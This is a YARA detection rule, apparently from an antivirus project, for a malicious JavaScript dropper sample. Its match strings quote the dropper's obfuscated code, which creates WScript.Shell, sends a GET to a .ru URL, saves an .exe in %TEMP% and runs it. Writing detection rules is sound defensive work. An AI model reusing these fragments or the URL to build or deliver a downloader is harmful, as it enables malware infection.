rule sig_20160401_f73d057f9451f682b00dda9a5ca1ff94 {
  meta:
    description = "datamaliciousorder - file 20160401_f73d057f9451f682b00dda9a5ca1ff94.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ce2cfeb580f4b36a14bdfb206fbb420d35c3134cfc068407c9c76e895b0fe61f"

  strings:
    $s1  = "function CuEcq(CdfJx, SgBb){ZgnWcl = ZgnWcl * 1; return CdfJx - SgBb;};" fullword ascii
    $s2  = "var NiaDmr = function MbQu() {return WScript[VvuUd](\"WScript\"+\".Shell\");}(), FtfJy = 11;" fullword ascii
    $s3  = "if (MaxXy[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "MaxXy[XoKvq](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s5  = "var FtPbn = false;" fullword ascii
    $s6  = "function SguVau(){return ViNso + \"\";};" fullword ascii
    $s7  = "function UpTuj() {return NiaDmr[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vEX27VgyqdUim3i.ex\" + \"e\";};" fullword ascii
    $s8  = "function VdXas() {return ((UohHr == true) && (UohHr == SbyZwi)) ? 1 : ZgnWcl;};" fullword ascii
    $s9  = "return CuEcq(JhNh, ThZw);" fullword ascii
    $s10 = "function KheEz(DgIoj) {var KnLk = (1, 2, 3, 4, 5, DgIoj); return KnLk;};" fullword ascii
    $s11 = "SbyZwi = true; " fullword ascii
    $s12 = "var SbyZwi = false;" fullword ascii
    $s13 = "function ShUj(){return 23;};" fullword ascii
    $s14 = "function LncUn()" fullword ascii
    $s15 = "UohHr = true; " fullword ascii
    $s16 = "function BbdVdm(XsnUoi){NiaDmr[\"R\"+\"un\"](XsnUoi, ZgnWcl, ZgnWcl);};" fullword ascii
    $s17 = "function GyrOyh(){return VvuUd;};" fullword ascii
    $s18 = "}while (CtFhc);" fullword ascii
    $s19 = "var UohHr = false;" fullword ascii
    $s20 = "    FtPbn = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}